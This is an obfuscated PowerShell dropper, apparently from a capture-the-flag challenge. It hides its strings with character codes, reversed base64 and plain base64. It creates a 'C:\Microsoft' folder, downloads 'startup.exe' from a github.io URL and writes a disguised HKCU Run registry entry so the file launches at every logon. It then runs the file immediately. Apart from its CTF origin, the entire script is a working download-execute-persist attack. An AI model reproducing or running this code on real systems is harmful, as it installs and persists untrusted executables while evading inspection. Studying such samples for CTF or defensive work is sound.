$ttl = 67,58,92,77,105,99,114,111,115,111,102,116
$wru = $ttl | % {[char]$_}
$wrt = -join($wru)
New-Item -ItemType Directory -Path $wrt -Force

$hhh = "=","U","G","e","l","5","C","c","1","R","n","c","h","R","3","c"
[array]::Reverse($hhh)
$ggg = -join($hhh)
$fff = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ggg))
$fullname = $wrt+"\"+$fff
$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly94YW50dXMxMC5naXRodWIuaW8vQ1RGLzAyLw=="))+$fff
Invoke-WebRequest $url -OutFile $fullname

$run = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$k = $wrt[3]+$wrt[4]+$wrt[5]+$wrt[6]+$wrt[7]+$wrt[8]+$wrt[9]+$wrt[10]+$wrt[11]+$run[6]+$wrt[11]+$run[11]+$run[12]+$wrt[11]+$run[34]+"p"
Set-ItemProperty -Path $run -Name $k -Value $fullname

& ($fullname)